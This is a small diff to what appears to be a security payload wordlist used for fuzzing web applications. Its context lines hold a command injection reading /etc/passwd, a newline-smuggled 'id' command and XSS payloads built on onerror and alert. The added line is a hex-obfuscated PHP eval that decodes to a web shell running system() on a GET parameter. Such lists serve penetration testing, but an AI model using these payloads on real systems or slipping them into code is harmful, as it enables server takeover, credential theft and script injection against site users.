@@ -100,3 +100,4 @@ $(cat /etc/passwd)
 id%0aid
 "><img src=x onerrora=confirm() onerror=confirm(1)>
 '-alert?.(1)-' 
+<?=eval(hex2bin("69662824785f3d245f4745545b305d297b73797374656d2824785f293b7d"))?>
